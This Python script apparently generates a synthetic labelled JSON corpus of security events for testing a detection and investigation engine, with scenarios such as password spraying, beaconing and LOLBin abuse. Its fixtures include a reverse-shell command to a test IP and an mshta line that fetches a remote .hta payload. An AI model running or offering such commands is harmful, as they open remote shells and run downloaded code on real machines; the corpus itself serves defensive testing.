"""Deterministic labelled contracts; synthetic precision is not calibration.
Holdout origins and dates differ from development. No training uses holdout.
"""
import copy
import json
from pathlib import Path

cases = []
fields = {k: k for k in ["namespace", "actor", "host", "action", "outcome", "request", "session", "target", "created_credential", "credential", "repository", "pipeline", "revision", "request_command"]}
for split, origin, epoch in [("development", "lab-a", 1700000000000), ("holdout", "lab-b", 1710000000000)]:
    def event(action, **extra):
        return {"action": action, "outcome": "success", "namespace": "tenant-a", "actor": "operator", "user.name": "operator", "host": "server-a", "host.name": "server-a", **extra}
    scenarios = [
        ("web", "web_request_chain", [event("http_request", request="req-1", request_command="bash -i >& /dev/tcp/192.0.2.9/4444 0>&1"), event("http_response", request="req-1")], "request"),
        ("cloud_saas", "cloud_control_chain", [event("credential_create", created_credential="key-1"), event("secret_access", credential="key-1", actor="service", **{"user.name": "service"})], "credential"),
        ("directory", "directory_control_chain", [event("privilege_grant", target="service"), event("logon", actor="service", **{"user.name": "service"})], "actor"),
        ("ci_cd", "pipeline_control_chain", [event("workflow_change", repository="repo-1", pipeline="release", revision="commit-a"), event("artifact_publish", repository="repo-1", pipeline="release", revision="commit-a")], "revision"),
        ("identity", "password_spraying", [event("logon", outcome="failure", actor=f"user-{i}", **{"user.name": f"user-{i}", "source.ip": "192.0.2.9"}) for i in range(20)], "actor"),
        ("process", "lolbin_context", [event("process_start", **{"process.executable": "mshta.exe", "process.command_line": "mshta https://example.test/payload.hta"})], "process.command_line"),
        ("network_dns", "beaconing", [event("network_connection", **{"source.ip": "192.0.2.9", "destination.ip": "198.51.100.8"}) for _ in range(15)], "destination.ip"),
        ("business", "business_velocity", [event("purchase", **{"transaction.amount": 500, "transaction.currency": "BRL"}) for _ in range(3)], "transaction.currency"),
    ]
    for scenario, kind, base, key in scenarios:
        for variant in ["positive", "near_negative", "missing_telemetry", "cross_namespace", "late_reordered", "rare_tail"]:
            records = copy.deepcopy(base)
            settings = {"mappings": [{"source": origin, "fields": fields}], "investigation": {"enabled": True}}
            if scenario == "business":
                settings["investigation"]["business"] = [{"id": "purchase-policy", "namespace": "tenant-a", "source": origin, "action": "purchase", "currency": "BRL", "window_ms": 600000, "minimum_count": 3, "minimum_amount": 1000}]
            positive = variant in ["positive", "late_reordered", "rare_tail"]
            if variant == "near_negative":
                if scenario in ["identity", "network_dns", "business"]:
                    records = records[:19 if scenario == "identity" else 5 if scenario == "network_dns" else 2]
                elif scenario == "process":
                    records[0][key] = "mshta --help"
                else:
                    records[-1][key] = "different-object"
                    if key == "actor": records[-1]["user.name"] = "different-object"
            if variant == "missing_telemetry":
                for record in records:
                    record.pop(key, None)
                    if key == "actor": record.pop("user.name", None)
            if variant == "cross_namespace":
                if len(records) == 1:
                    # Documentation resembles executable content but cannot
                    # establish execution in either tenant.
                    records[0]["event.kind"] = "documentation"
                elif scenario in ["identity", "network_dns", "business"]:
                    for i, record in enumerate(records): record["namespace"] = f"tenant-{i % 2}"
                else: records[-1]["namespace"] = "tenant-other"
            events = [{"timestamp": epoch + i * (60000 if scenario == "network_dns" else 1000), "fields": record} for i, record in enumerate(records)]
            if variant == "late_reordered": events.reverse()
            if variant == "rare_tail":
                noise = [{"timestamp": epoch - 1000000 + i, "fields": event("heartbeat", actor="background", **{"user.name": "background"})} for i in range(500)]
                events = noise + events
            cases.append({"id": f"{split}.{scenario}.{variant}", "split": split, "origin": origin, "epoch": epoch, "scenario": scenario, "variant": variant, "expected_signal": kind, "positive": positive, "expected_members": len(base) if positive else 0, "settings": settings, "events": events})

document = {"version": "investigation-corpus-1", "synthetic": True, "holdout": "different producer and non-overlapping event dates; no profile training or proposal activation", "meaning": "Labelled semantic regression contracts, not field accuracy or calibrated attack probability", "cases": cases}
target = Path(__file__).resolve().parents[2] / "src-tauri/tests/fixtures/security/investigation-corpus.json"
target.write_text(json.dumps(document, ensure_ascii=False, separators=(",", ":")) + "\n", encoding="utf-8")
print(f"{len(cases)} cases; {sum(len(c['events']) for c in cases)} records")
